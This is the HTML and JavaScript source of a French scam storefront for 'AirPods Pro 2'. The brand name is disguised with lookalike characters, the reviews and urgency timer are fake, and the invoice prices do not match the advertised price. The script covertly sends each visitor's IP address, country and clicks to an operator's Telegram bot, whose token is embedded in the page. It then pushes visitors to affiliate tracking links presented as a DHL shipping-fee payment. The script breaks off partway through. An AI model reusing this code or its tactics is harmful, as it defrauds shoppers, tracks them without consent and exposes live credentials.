<!DOCTYPE html>
<html lang="fr">
<head>
<meta name="p:domain_verify" content="6e9abc24c9c419575bc20271684efe1c"/>
    <!-- Pinterest Tag -->
<script>
!function(e){if(!window.pintrk){window.pintrk = function () {
window.pintrk.queue.push(Array.prototype.slice.call(arguments))};var
  n=window.pintrk;n.queue=[],n.version="3.0";var
  t=document.createElement("script");t.async=!0,t.src=e;var
  r=document.getElementsByTagName("script")[0];
  r.parentNode.insertBefore(t,r)}}("https://s.pinimg.com/ct/core.js");
pintrk('load', '2613445496968', {em: '<user_email_address>'});
pintrk('page');
</script>
<noscript>
<img height="1" width="1" style="display:none;" alt=""
  src="https://ct.pinterest.com/v3/?event=init&tid=2613445496968&pd[em]=<hashed_email_address>&noscript=1" />
</noscript>
<!-- end Pinterest Tag -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ê—ñ–≥–†–æd—ï –†–≥–æ  2 - Offre Exclusive</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background: #fff; color: #111; }
        .image-shadow { box-shadow: 0 8px 30px rgba(0,0,0,0.10); border-radius: 1.5rem; }
        .cart-bar { display:none;position:fixed;top:90px;left:50%;transform:translateX(-50%);
            background:#fff;border:2px solid #2563eb;min-width:300px;padding:14px 20px;
            border-radius:14px;z-index:1000;box-shadow:0 4px 20px rgba(59,130,246,0.10);
            align-items:center; font-weight:500;font-size:1rem;gap:10px;
            transition: opacity 0.5s, top 0.5s; opacity: 0;
        }
        .show-cart-bar { display:flex!important; top: 20px; opacity: 1;}
        .modal { display:none;position:fixed;left:0;top:0;width:100vw;height:100vh;
            background:rgba(0,0,0,0.40);align-items:center;justify-content:center;z-index:10001;}
        .modal-content {background:#fff;border-radius:18px;padding:2rem;
            box-shadow:0 8px 40px rgba(0,0,0,0.14);width:100%;max-width:480px;text-align:center;position:relative;}
        .close-btn {position:absolute;right:18px;top:16px;font-size:1.5rem;color:#bdbdbd;cursor:pointer;}
        .close-btn:hover {color:#2563eb;}
        .quantity-input {width:48px;text-align:center;border:1px solid #d1d5db;
            border-radius:0.375rem;background:#f3f4f6;font-weight:700;padding:0.25rem 0;}
        .animate-spin {animation:spin 1s linear infinite;} @keyframes spin { to{transform:rotate(360deg);} }
        .features-img {display:block;width:100%;margin:0 auto 0 auto;padding:0;border-radius:0; max-width: 450px;}
        .details-btn {display:block;width:100%;margin:0 auto 24px auto;}
        .policy-modal {display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:20000;background:rgba(0,0,0,0.40);align-items:center;justify-content:center;}
        .policy-content {background:#fff;border-radius:16px;padding:28px;max-width:500px;width:95%;box-shadow:0 8px 40px rgba(0,0,0,0.13);max-height: 80vh; overflow-y: auto; text-align: left;}
        .policy-content h2 { text-align: center; }
        
        #paymentMethodModal .modal-content {
            max-width: 520px;
        }

        /* Invoice Styles */
        .invoice-box {
            background-color: #f9fafb;
            border: 1px solid #e5e7eb;
            border-radius: 12px;
            padding: 1.5rem;
            text-align: left;
        }
        .invoice-line {
            display: flex;
            justify-content: space-between;
            padding: 0.5rem 0;
            border-bottom: 1px solid #f3f4f6;
        }
        .invoice-total {
            font-size: 1.25rem;
            font-weight: bold;
            margin-top: 0.5rem;
        }
        .payment-logos img {
            height: 32px;
            margin: 0 4px;
        }

        /* Other original styles */
        .logo-container { position: relative; width: 56px; height: 56px; margin-bottom: 0.5rem; cursor: pointer; }
        .logo-image { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: contain; opacity: 0; transform: translateY(10px); transition: opacity 0.75s ease-in-out, transform 0.75s ease-in-out; }
        .logo-image.active { opacity: 1; transform: translateY(0); }
        .shiny-silver-text { background: linear-gradient(170deg, #f8f8f8 5%, #d8d8d8 30%, #b8b8b8 50%, #a0a0a0 70%, #c0c0c0 95%); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; color: #b8b8b8; text-shadow: 0px 1px 2px rgba(255,255,255,0.4), 0px -1px 1px rgba(50,50,50,0.1); cursor: pointer; }
        #topNavMenu { background-color: #ffffff; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 0.5rem 0; position: absolute; top: 100%; left: 0; right: 0; z-index: 30; max-height: 0; overflow: hidden; transition: max-height 0.5s ease-in-out; }
        #topNavMenu.nav-open { max-height: 300px; padding: 1rem 0; }
        #topNavMenu ul { list-style: none; padding: 0; margin: 0; text-align: center; }
        #topNavMenu ul li a { display: block; padding: 0.75rem 1rem; color: #374151; text-decoration: none; font-weight: 500; transition: background-color 0.2s, color 0.2s; }
        #topNavMenu ul li a:hover { background-color: #f3f4f6; color: #1d4ed8; }
        #floatingOrderBtn { position: fixed; bottom: 20px; left: 50%; z-index: 999; display: block; padding: 0.75rem 1.5rem; font-size: 1rem; box-shadow: 0 -2px 10px rgba(0,0,0,0.15); opacity: 0; transform: translate(-50%, 100%); transition: opacity 0.4s ease-out, transform 0.4s ease-out; }
        #floatingOrderBtn.visible { opacity: 1; transform: translate(-50%, 0); animation: pulseGlow 2s infinite ease-in-out, gentleShake 0.5s ease-in-out; }
        #floatingOrderBtn:hover { transform: translate(-50%, -5px); }
        @keyframes pulseGlow { 0% { box-shadow: 0 -2px 10px rgba(37, 99, 235, 0.2), 0 0 0 0px rgba(37, 99, 235, 0.3); } 70% { box-shadow: 0 -2px 15px rgba(37, 99, 235, 0.4), 0 0 0 10px rgba(37, 99, 235, 0); } 100% { box-shadow: 0 -2px 10px rgba(37, 99, 235, 0.2), 0 0 0 0px rgba(37, 99, 235, 0); } }
        @keyframes gentleShake { 0%, 100% { transform: translate(-50%, 0) rotate(0deg); } 25% { transform: translate(-50%, 0) rotate(-2deg); } 75% { transform: translate(-50%, 0) rotate(2deg); } }
        .review-card { background-color: white; border-radius: 12px; padding: 1.5rem; box-shadow: 0 4px 12px rgba(0,0,0,0.08); margin-bottom: 1.5rem; transition: transform 0.2s ease-in-out; }
        .review-card:hover { transform: translateY(-5px); }
        .review-avatar { width: 60px; height: 60px; border-radius: 50%; margin-right: 1rem; object-fit: cover; border: 2px solid #e5e7eb; }
        .review-stars { color: #f59e0b; margin-bottom: 0.5rem; }
        .trustpilot-badge { max-height: 70px; max-width: 250px; width: auto; margin-top: 1rem; margin-bottom: 2rem; }
        .payment-card.border-blue-600 { border-color: #2563eb; }
        .payment-card.shadow-lg { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }

    </style>
</head>
<body class="bg-white text-gray-800">

    <button id="floatingOrderBtn" class="bg-blue-600 hover:bg-blue-700 transition rounded-xl text-white font-bold">
        Commander maintenant
    </button>

    <div id="cartBar" class="cart-bar">
        <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="–ê—ñ–≥–†–æd—ï " class="w-10 h-10 object-contain rounded-lg border border-gray-200" onerror="this.onerror=null;this.src='https://placehold.co/40x40/f0f0f0/333?text=Img';">
        <span>üõí Produit ajout√© au panier</span>
    </div>

    <header id="mainHeader" class="w-full pt-5 pb-2 px-4 flex flex-col items-center bg-white sticky top-0 z-40">
        <div id="logoArea" class="flex flex-col items-center cursor-pointer">
            <div class="logo-container">
                <img id="logoImg1" src="https://i.postimg.cc/GtJNm9yD/Screenshot-20250525-200139-Chrome.jpg" alt="Logo AirPod Style 1" class="logo-image active" onerror="this.src='https://placehold.co/56x56/cccccc/ffffff?text=Logo'; this.alt='Logo indisponible'">
                <img id="logoImg2" src="https://i.postimg.cc/yNpbtZsm/–ê—Ä—Äl–µ-Logosu.png" alt="Logo AirPod Style 2" class="logo-image" onerror="this.src='https://placehold.co/56x56/cccccc/ffffff?text=Logo'; this.alt='Logo indisponible'">
            </div>
            <span class="text-3xl font-extrabold tracking-tight mb-0 shiny-silver-text" style="letter-spacing:-1px;">–ê—ñ–≥–†–æd </span>
        </div>
        <nav id="topNavMenu">
            <ul>
                <li><a href="#home" class="nav-link">Accueil</a></li>
                <li><a href="#reviews-section" class="nav-link">Avis Clients</a></li>
                <li><a href="#features-section" class="nav-link">Infos Produit</a></li>
            </ul>
        </nav>
    </header>

    <main>
        <section id="home" class="container mx-auto px-4 pt-4 pb-7 flex flex-col items-center">
            <h1 class="text-4xl sm:text-5xl font-extrabold text-center leading-tight text-gray-900 mb-3">Offre exclusive sur –ê—ñ–≥–†–æd—ï –†–≥–æ  2 !</h1>
            <p class="text-lg text-gray-600 text-center max-w-xl mb-2">
                Pour f√™ter l'anniversaireüéâ de la sortie des –ê—ñ–≥–†–æd—ï , b√©n√©ficiez d'une offre exclusive sur les –ê—ñ–≥–†–æd—ï –†–≥–æ  2 ‚Äì une qualit√© –ê—Ä—Äl–µ √† un prix symbolique !
            </p>
            <div class="flex items-end space-x-4 mx-auto mb-2">
                <span class="text-4xl font-bold text-blue-600">49,99‚Ç¨</span>
                <span class="text-lg line-through text-gray-400"></span>
            </div>
            <div class="text-red-600 font-semibold mb-1 text-center">Offre se termine dans : <span id="timer" class="ml-2">02:30:00</span></div>
            <button id="orderBtn" class="bg-blue-600 hover:bg-blue-700 transition px-8 py-3 rounded-2xl shadow-lg text-white text-xl font-bold mt-2 mb-4 w-full sm:w-auto">Commander maintenant</button>
            <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="–ê—ñ–≥–†–æd—ï –†–≥–æ  2 blanc" class="max-w-xs w-full mb-2 image-shadow" style="margin-bottom:12px;" onerror="this.onerror=null;this.src='https://placehold.co/320x320/f0f0f0/333?text=–ê—ñ–≥–†–æd—ï ';">
            <button id="detailsBtn" class="details-btn border-2 border-blue-600 rounded-2xl py-3 px-6 text-blue-700 text-lg font-semibold bg-white hover:bg-blue-50">Voir d√©tails et infos produit ‚Üì</button>
        </section>

        <section id="reviews-section" class="py-12 bg-gray-50">
           <div class="container mx-auto px-4">
                <h2 class="text-3xl font-bold text-center text-gray-800 mb-8">Ce que disent nos clients</h2>
                 <div class="max-w-4xl mx-auto grid md:grid-cols-2 gap-8">
                    <div class="review-card">
                        <div class="flex items-center mb-4">
                            <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Avatar client" class="review-avatar" onerror="this.onerror=null;this.src='https://placehold.co/60x60/f0f0f0/333?text=A';">
                            <div>
                                <p class="font-bold text-gray-800">Marc L.</p>
                                <div class="review-stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÜ</div>
                            </div>
                        </div>
                        <p class="text-gray-600">Super offre, je ne pouvais pas la laisser passer. La qualit√© sonore est incroyable pour ce prix. Livraison rapide !</p>
                    </div>
                    <div class="review-card">
                        <div class="flex items-center mb-4">
                            <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Avatar client" class="review-avatar" onerror="this.onerror=null;this.src='https://placehold.co/60x60/f0f0f0/333?text=A';">
                            <div>
                                <p class="font-bold text-gray-800">Julie R.</p>
                                <div class="review-stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ</div>
                            </div>
                        </div>
                        <p class="text-gray-600">J'√©tais sceptique au d√©but mais tout est parfait. Les √©couteurs fonctionnent √† merveille. Service client au top.</p>
                    </div>
                </div>
                <div class="text-center mt-8">
                     <img src="https://cdn.trustpilot.net/brand-assets/4.1.0/logo-white.svg" alt="Trustpilot" class="trustpilot-badge inline-block bg-gray-800 p-2 rounded" style="background-color: #000411; padding: 10px 15px; border-radius: 8px;" onerror="this.style.display='none'">
                </div>
           </div>
        </section>

        <!-- Features Section UPDATED with Direct Links -->
        <section id="features-section" class="container mx-auto px-0 pb-12 pt-2 bg-black">
            <h2 class="text-3xl font-bold text-center text-white my-8">Fonctionnalit√©s Cl√©s</h2>
            <img src="https://i.postimg.cc/Dw3Gd5V3/da57bd9d-52ca-482c-a053-b90b4c977fc1-PT0-V1.jpg" alt="ŸÖŸäÿ≤ÿßÿ™ –ê—ñ–≥–†–æd—ï –†–≥–æ  - ÿµŸàÿ™ ŸÖŸÜ ŸÖÿ≥ÿ™ŸàŸâ ÿ¢ÿÆÿ±" class="features-img" onerror="this.onerror=null;this.src='https://placehold.co/450x800/000000/ffffff?text=Feature+1';">
            <img src="https://i.postimg.cc/T2SghfCw/7a46b21d-1897-4d46-9095-df9c0ded80c8-PT0-V1.jpg" alt="ŸÖŸäÿ≤ÿßÿ™ –ê—ñ–≥–†–æd—ï –†–≥–æ  - ÿµŸàÿ™ ŸÖÿ™ŸÉŸäŸÅ Ÿàÿ¥ŸÅÿßŸÅŸäÿ©" class="features-img" onerror="this.onerror=null;this.src='https://placehold.co/450x800/000000/ffffff?text=Feature+2';">
            <img src="https://i.postimg.cc/FsLcL8Bx/98cf4677-c95c-4b4e-bdf3-78c6012f2cad-PT0-V1.jpg" alt="ŸÖŸäÿ≤ÿßÿ™ –ê—ñ–≥–†–æd—ï –†–≥–æ  - ÿµŸàÿ™ ŸÖŸÉÿßŸÜŸä ŸÖÿÆÿµÿµ" class="features-img" onerror="this.onerror=null;this.src='https://placehold.co/450x800/000000/ffffff?text=Feature+3';">
            <img src="https://i.postimg.cc/L5qPvb62/5fe6bf1a-7363-4561-aa6a-bb2a7d2f1dfc-PT0-V1.jpg" alt="ŸÖŸäÿ≤ÿßÿ™ –ê—ñ–≥–†–æd—ï –†–≥–æ  - ŸÖŸÇÿßŸàŸÖÿ© ŸÑŸÑŸÖÿßÿ° Ÿàÿ™ÿ≠ÿØŸäÿØ ÿßŸÑŸÖŸàŸÇÿπ" class="features-img" onerror="this.onerror=null;this.src='https://placehold.co/450x800/000000/ffffff?text=Feature+4';">
            <img src="https://i.postimg.cc/brKt59sb/95934616-b3b2-4f30-902a-dd072fc3f5a9-PT0-V1.jpg" alt="ŸÖŸÇÿßÿ±ŸÜÿ© ÿ®ŸäŸÜ ŸÖŸàÿØŸäŸÑÿßÿ™ –ê—ñ–≥–†–æd—ï " class="features-img" onerror="this.onerror=null;this.src='https://placehold.co/450x800/000000/ffffff?text=Feature+5';">
            <img src="https://i.postimg.cc/Qtd1KM2B/2a3a5a51-929b-40a3-876e-8144deb87846-PT0-V1.jpg" alt="ŸÖŸäÿ≤ÿßÿ™ –ê—ñ–≥–†–æd—ï –†–≥–æ  - ÿ™ŸàÿßŸÅŸÇ ÿ≥ÿ≠ÿ±Ÿä" class="features-img" onerror="this.onerror=null;this.src='https://placehold.co/450x800/000000/ffffff?text=Feature+6';">
        </section>

        <footer class="bg-gray-900 text-gray-300 py-8">
           <div class="container mx-auto px-4 text-center">
               <p>&copy; <span id="currentYear">2025</span> Offre Sp√©ciale –ê—ñ–≥–†–æd—ï . Tous droits r√©serv√©s.</p>
                <div class="mt-4">
                    <a href="#" class="text-gray-400 hover:text-white mx-2 policy-link" data-policy="shipping">Politique de livraison</a>
                    <a href="#" class="text-gray-400 hover:text-white mx-2 policy-link" data-policy="returns">Politique de retour</a>
                </div>
           </div>
        </footer>
    </main>

    <!-- Step 1: Add to Cart Modal -->
    <div id="addToCartModal" class="modal">
        <div class="modal-content">
            <span class="close-btn">&times;</span>
            <h2 class="text-2xl font-bold mb-4 text-gray-800">Ajouter au Panier</h2>
            <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="–ê—ñ–≥–†–æd—ï " class="w-24 h-24 object-contain rounded-lg border border-gray-200 mx-auto mb-4" onerror="this.onerror=null;this.src='https://placehold.co/96x96/f0f0f0/333?text=Img';">
            <div class="mb-5">
                <label class="block text-gray-700 font-semibold mb-1 text-center">Quantit√© :</label>
                <input type="number" class="quantity-input mx-auto" value="1" readonly>
                <span class="block text-xs text-gray-500 mt-2">Quantit√© limit√©e : une seule pi√®ce par commande.</span>
            </div>
            <button id="confirmAddToCartBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg shadow-md transition text-base sm:text-lg flex items-center justify-center gap-2">
                <span style="font-size: 1.2rem;">üõí</span> Continuer
            </button>
        </div>
    </div>
    
    <!-- Step 2: Payment Method Selection Modal -->
    <div id="paymentMethodModal" class="modal">
        <div class="modal-content">
            <span class="close-btn">&times;</span>
            <h2 class="text-2xl font-bold mb-5 text-gray-800">Choisissez votre m√©thode de paiement</h2>
            
             <div id="payment-methods" class="flex flex-col gap-4 mt-4">
              <!-- Paiement en ligne -->
              <div class="payment-card transition-all duration-200 border-2 border-gray-200 rounded-2xl bg-white shadow-sm hover:shadow-md cursor-pointer" data-method="online">
                <div class="flex items-center justify-between p-4">
                  <!-- Icon on the Left -->
                  <div class="w-auto h-10 flex items-center justify-center bg-blue-50 rounded-xl p-2">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" class="h-6" alt="Visa" onerror="this.style.display='none'">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/MasterCard_Logo.svg" class="h-6 ml-1" alt="Mastercard" onerror="this.style.display='none'">
                  </div>
                  <!-- Text on the Right -->
                  <span class="font-bold text-lg text-gray-800">Paiement en ligne</span>
                </div>
                <!-- Details: hidden by default -->
                <div class="payment-details hidden border-t border-gray-100 px-4 pb-4 pt-3 text-gray-700 text-left">
                  <div class="flex items-center gap-2 mb-2">
                    <span class="font-semibold text-blue-700 text-xl">49‚Ç¨</span>
                  </div>
                  <div>
                    Payez la totalit√© : <span class="font-semibold">49,99‚Ç¨</span> pour le produit + <span class="font-semibold">10‚Ç¨</span> de frais de livraison, directement et en toute s√©curit√© en ligne par carte bancaire.
                  </div>
                </div>
              </div>
              <!-- Paiement √† la livraison -->
              <div class="payment-card transition-all duration-200 border-2 border-gray-200 rounded-2xl bg-white shadow-sm hover:shadow-md cursor-pointer" data-method="cod">
                <div class="flex items-center justify-between p-4">
                  <!-- Icon on the Left -->
                  <div class="w-10 h-10 flex items-center justify-center rounded-xl overflow-hidden">
                     <img src="https://i.postimg.cc/1tw5r2nf/Screenshot-20250615-204032-Chrome.jpg" class="h-full w-full object-cover" alt="Paiement √† la livraison" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/ffffff?text=COD';">
                  </div>
                  <!-- Text on the Right -->
                  <span class="font-bold text-lg text-gray-800">Paiement √† la livraison</span>
                </div>
                <!-- Details: hidden by default -->
                <div class="payment-details hidden border-t border-gray-100 px-4 pb-4 pt-3 text-gray-700 text-left">
                  <div class="flex items-center gap-2 mb-2">
                    <span class="font-semibold text-blue-700 text-xl">10‚Ç¨</span>
                    <span class="text-sm text-gray-500">(√† payer maintenant)</span>
                  </div>
                  <div>
                    Payez uniquement les frais de livraison (<b>10‚Ç¨</b>) pour confirmer la commande. <br>
                    Vous r√©glerez le reste (<b>49,99‚Ç¨</b>) en esp√®ces √† la r√©ception.
                  </div>
                </div>
              </div>
            </div>
            <button id="nextToInvoiceBtn" class="w-full bg-gray-400 text-white font-bold py-3 mt-4 rounded-lg transition text-lg" disabled>
              Suivant
            </button>
        </div>
    </div>


    <!-- Step 3a: Online Payment Invoice Modal -->
    <div id="invoiceOnlineModal" class="modal">
        <div class="modal-content">
            <span class="close-btn">&times;</span>
            <h2 class="text-2xl font-bold mb-4 text-gray-800">R√©capitulatif de la commande</h2>
            <div class="invoice-box">
                <div class="invoice-line"><span>Produit (–ê—ñ–≥–†–æd—ï –†–≥–æ  2)</span><span>39.00‚Ç¨</span></div>
                <div class="invoice-line"><span>Livraison</span><span>10.00‚Ç¨</span></div>
                <div class="invoice-line invoice-total"><span>TOTAL</span><span>49.00‚Ç¨</span></div>
            </div>
            <p class="text-xs text-gray-500 my-4">Vous serez redirig√© vers notre passerelle de paiement 100% s√©curis√©e pour finaliser votre achat.</p>
            <button id="completeOnlineOrderBtn" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-lg shadow-md transition text-lg">
                Compl√©ter la commande
            </button>
            <div class="flex items-center justify-center gap-4 mt-4 payment-logos">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" onerror="this.style.display='none'">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/1200px-MasterCard_Logo.svg.png" alt="Mastercard" onerror="this.style.display='none'">
                <span style="font-size:1.5rem; color:#15803d;">üîí</span>
            </div>
        </div>
    </div>

    <!-- Step 3b: COD Invoice Modal -->
    <div id="invoiceCodModal" class="modal">
        <div class="modal-content">
            <span class="close-btn">&times;</span>
            <h2 class="text-2xl font-bold mb-4 text-gray-800">Confirmez votre commande</h2>
            <div class="invoice-box">
                <div class="invoice-line"><span>Frais de livraison (√† payer maintenant)</span><span class="font-bold text-blue-600">10.00‚Ç¨</span></div>
                <div class="invoice-line"><span>Produit (√† payer √† la livraison)</span><span>39.00‚Ç¨</span></div>
            </div>
             <p class="text-xs text-gray-500 my-4">Pour d√©marrer le processus d'exp√©dition, veuillez r√©gler les frais de livraison de notre partenaire <b>DHL</b>. Le montant restant du produit sera d√ª au livreur √† la r√©ception.</p>
            <button id="completeCodOrderBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg shadow-md transition text-lg flex items-center justify-center gap-3">
                Payer les frais et commander (10.00‚Ç¨)
            </button>
             <div class="flex items-center justify-center gap-4 mt-4 payment-logos">
                <img src="https://i.postimg.cc/JhtQ0cyT/images-10.png" alt="DHL" style="height:28px;" onerror="this.style.display='none'">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" onerror="this.style.display='none'">
                <span style="font-size:1.5rem; color:#15803d;">üîí</span>
            </div>
        </div>
    </div>

    <!-- Final Step: Loading Page -->
    <div id="loadingPopup" class="modal">
        <div class="modal-content flex flex-col items-center justify-center">
            <div class="animate-spin rounded-full border-4 border-gray-200 border-t-blue-600 w-12 h-12 mb-4"></div>
            <h3 class="text-lg font-bold text-gray-800 mb-2">Redirection vers le paiement s√©curis√©...</h3>
            <p class="text-gray-600 text-sm mb-3">Veuillez patienter. Votre s√©curit√© est notre priorit√©.</p>
        </div>
    </div>
    
    <!-- Policy Modals -->
    <div id="policyModal" class="policy-modal">
        <div class="policy-content">
            <span class="close-btn" onclick="document.getElementById('policyModal').style.display='none'">&times;</span>
            <h2 id="policyTitle" class="text-2xl font-bold mb-4"></h2>
            <div id="policyText" class="text-gray-700 leading-relaxed"></div>
        </div>
    </div>


    <script>
    // --- Telegram Alert Configuration ---
    const TELEGRAM_BOT_TOKEN = '8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU'; 
    const TELEGRAM_CHAT_ID = '-4913064483';

    async function sendTelegramAlert(action, details = {}) {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
             console.warn("Telegram token/chat ID not configured. Skipping alert.");
             return;
        }

        let ipInfo = { ip: 'N/A', country_name: 'N/A', country_code: 'N/A' };
        try {
            const ipRes = await fetch('https://api.country.is/');
            if (ipRes.ok) {
                const data = await ipRes.json();
                ipInfo = { ip: data.ip || 'N/A', country_name: data.country || 'N/A', country_code: data.country || 'N/A' };
            }
        } catch (e) { 
            console.error("Could not fetch IP info:", e);
        }

        let emoji = 'üîî'; // Default
        if (/paiement final/i.test(action)) emoji = 'üí≥';
        else if (/facture/i.test(action)) emoji = 'üßæ';
        else if (/m√©thode choisie/i.test(action)) emoji = 'üëÜ';
        else if (/panier/i.test(action) || /continuer/i.test(action)) emoji = 'üõí';
        else if (/detail/i.test(action)) emoji = '‚ÑπÔ∏è';
        else if (/page/i.test(action)) emoji = 'üìÑ';
        else if (/policy/i.test(action) || /nav/i.test(action) ) emoji = 'üîó';
        
        let msg = `${emoji} <b>Action:</b> ${action}\n`;
        msg += `üåç <b>Pays:</b> ${ipInfo.country_name} (${ipInfo.country_code})\n`;
        msg += `üåê <b>IP:</b> ${ipInfo.ip}\n`;
        msg += `üïí <b>Heure:</b> ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n`;
        
        if (details && Object.keys(details).length) {
            msg += `\nüìã <b>D√©tails:</b>\n`;
            Object.entries(details).forEach(([key, value]) => {
                msg += ` - ${key}: ${String(value).replace(/</g, "&lt;").replace(/>/g, "&gt;")}\n`;
            });
        }

        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
            });
            if (!response.ok) {
                console.error("Telegram API Error:", await response.json());
            }
        } catch (error) { console.error("Error sending Telegram alert:", error); }
    }

    document.addEventListener('DOMContentLoaded', () => {

        const orderBtn = document.getElementById('orderBtn');
        const floatingOrderBtn = document.getElementById('floatingOrderBtn');
        const detailsBtn = document.getElementById('detailsBtn');
        const cartBar = document.getElementById('cartBar');
        const addToCartModal = document.getElementById('addToCartModal');
        const paymentMethodModal = document.getElementById('paymentMethodModal');
        const invoiceOnlineModal = document.getElementById('invoiceOnlineModal');
        const invoiceCodModal = document.getElementById('invoiceCodModal');
        const loadingPopup = document.getElementById('loadingPopup');
        const confirmAddToCartBtn = document.getElementById('confirmAddToCartBtn');
        const nextToInvoiceBtn = document.getElementById('nextToInvoiceBtn');
        const completeOnlineOrderBtn = document.getElementById('completeOnlineOrderBtn');
        const completeCodOrderBtn = document.getElementById('completeCodOrderBtn');
        let selectedPaymentMethod = null;

        function openAddToCartModal() {
            if (addToCartModal) {
                addToCartModal.style.display = "flex";
                sendTelegramAlert('Fen√™tre "Ajouter au panier" ouverte');
            }
        }
        if(orderBtn) orderBtn.addEventListener('click', openAddToCartModal);
        if(floatingOrderBtn) floatingOrderBtn.addEventListener('click', openAddToCartModal);
        
        if(detailsBtn) {
            detailsBtn.addEventListener('click', () => {
                document.getElementById('features-section').scrollIntoView({ behavior: 'smooth' });
                sendTelegramAlert('Clic sur "Voir d√©tails"');
            });
        }

        if (confirmAddToCartBtn) {
            confirmAddToCartBtn.addEventListener('click', () => {
                if (addToCartModal) addToCartModal.style.display = "none";
                if (paymentMethodModal) paymentMethodModal.style.display = "flex";
                if (cartBar) {
                    cartBar.classList.add("show-cart-bar");
                    setTimeout(() => { cartBar.classList.remove("show-cart-bar"); }, 2500);
                }
                sendTelegramAlert('Clic sur "Continuer" depuis le panier');
            });
        }
        
        const paymentCards = document.querySelectorAll('.payment-card');
        paymentCards.forEach(card => {
          card.addEventListener('click', () => {
            paymentCards.forEach(c => {
              c.classList.remove('border-blue-600', 'shadow-lg');
              c.querySelector('.payment-details').classList.add('hidden');
            });
            card.classList.add('border-blue-600', 'shadow-lg');
            card.querySelector('.payment-details').classList.remove('hidden');
            selectedPaymentMethod = card.getAttribute('data-method');

            nextToInvoiceBtn.disabled = false;
            nextToInvoiceBtn.classList.remove('bg-gray-400');
            nextToInvoiceBtn.classList.add('bg-blue-600', 'hover:bg-blue-700');
            sendTelegramAlert('M√©thode de paiement choisie', { m√©thode: selectedPaymentMethod });
          });
        });

        if (nextToInvoiceBtn) {
            nextToInvoiceBtn.addEventListener('click', () => {
                if (!selectedPaymentMethod) return;
                if (paymentMethodModal) paymentMethodModal.style.display = 'none';

                if (selectedPaymentMethod === 'online') {
                    if (invoiceOnlineModal) invoiceOnlineModal.style.display = 'flex';
                    sendTelegramAlert('Page de facture affich√©e', { type: 'Paiement en ligne Int√©gral' });
                } else if (selectedPaymentMethod === 'cod') {
                    if (invoiceCodModal) invoiceCodModal.style.display = 'flex';
                    sendTelegramAlert('Page de facture affich√©e', { type: 'Paiement des frais de livraison' });
                }
            });
        }
        
        function finalizeOrder(amount, paymentType) {
            [addToCartModal, paymentMethodModal, invoiceOnlineModal, invoiceCodModal].forEach(modal => {
                if(modal) modal.style.display = 'none';
            });

            if(loadingPopup) loadingPopup.style.display = "flex";
            sendTelegramAlert('Lancement du paiement final', { montant: amount, m√©thode: paymentType });
            
            setTimeout(() => {
                let redirectUrl = "https://ttgn.tracktimegenius.com/aff_c?offer_id=85898&aff_id=1931&source=Frais+de+Livraison+DHL+√†+R√©gler+pour+Lancer+l‚ÄôExp√©dition___https://i.postimg.cc/JhtQ0cyT/images-10.png"; // Default for COD
                let redirectSiteName = "Google";

                if (paymentType === 'En ligne') {
                    redirectUrl = "https://ttgn.tracktimegenius.com/aff_c?offer_id=88769&aff_id=1931&source=AirPods+Pro+2___https://inidkan.com/3234-large_default/airpods-pro-2-vrac.jpg";
                    redirectSiteName = "YouTube";
                }
                
                sendTelegramAlert(`Redirection (simulation) vers ${redirectSiteName} initi√©e`);
                window.location.href = redirectUrl;
            }, 2500);
        }

        if (completeOnlineOrderBtn) {
            completeOnlineOrderBtn.addEventListener('click', () => finalizeOrder('49.00‚Ç¨', 'En ligne'));
        }
        if (completeCodOrderBtn) {
            completeCodOrderBtn.addEventListener('click', () => finalizeOrder('10.00‚Ç¨', 'Frais de livraison (COD)'));
        }

        function setupModalClose(modalId) {
            const modal = document.getElementById(modalId);
            if (!modal) return;
            const closeBtn = modal.querySelector('.close-btn');
            
            const closeModal = () => { modal.style.display = 'none'; };
            
            if (closeBtn) {
                closeBtn.addEventListener('click', closeModal);
            }
            modal.addEventListener('click', (event) => {
                if (event.target === modal) {
                    closeModal();
                }
            });
        }
        ['addToCartModal', 'paymentMethodModal', 'invoiceOnlineModal', 'invoiceCodModal'].forEach(setupModalClose);
        
        const mainTimerDisplay = document.getElementById('timer');
        if(mainTimerDisplay) {
            let totalSeconds = (2 * 60 * 60) + (30 * 60);
            let mainTimerInterval = setInterval(() => {
                if(totalSeconds <= 0) {
                    clearInterval(mainTimerInterval);
                    mainTimerDisplay.textContent = "Expir√©e!";
